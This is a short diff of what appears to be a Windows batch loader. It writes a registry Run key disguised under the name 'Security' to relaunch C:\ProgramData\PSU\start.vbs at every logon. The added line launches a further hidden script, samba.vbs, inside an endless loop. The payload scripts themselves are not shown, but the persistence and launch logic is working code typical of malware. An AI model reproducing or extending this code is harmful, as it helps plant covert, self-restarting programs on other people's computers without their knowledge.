@@ -6,5 +6,6 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 goto start
 :execute
+start "" "C:\ProgramData\PSU\samba.vbs"
 start "" "C:\ProgramData\PSU\execute.vbs"
 goto start
